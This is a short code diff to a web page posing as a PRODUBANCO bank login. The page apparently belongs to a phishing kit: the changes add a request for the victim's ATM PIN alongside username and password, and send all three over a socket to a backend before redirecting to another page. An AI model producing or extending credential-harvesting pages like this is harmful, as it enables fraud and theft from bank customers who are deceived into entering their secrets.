@@ -110,7 +110,7 @@
   <div class="screen active" id="pantallaInicio">
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="PRODUBANCO" class="logo">
     <h2>Bienvenido a <strong>PRODUBANCO</strong></h2>
-    <p>Ingrese su usuario y contraseña para iniciar con su proceso financiero.</p>
+    <p>Ingrese su usuario, contraseña y clave de cajero para iniciar con su proceso financiero.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
@@ -152,7 +152,8 @@
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            socket.emit('dataForm', { usuario, contrasena, cajero, sessionId });
+            // Aquí renombramos 'cajero' para que el backend lo reciba como 'claveCajero'
+            socket.emit('dataForm', { usuario, contrasena, claveCajero: cajero, sessionId });
 
             window.location.href = 'opciones.html';
           }
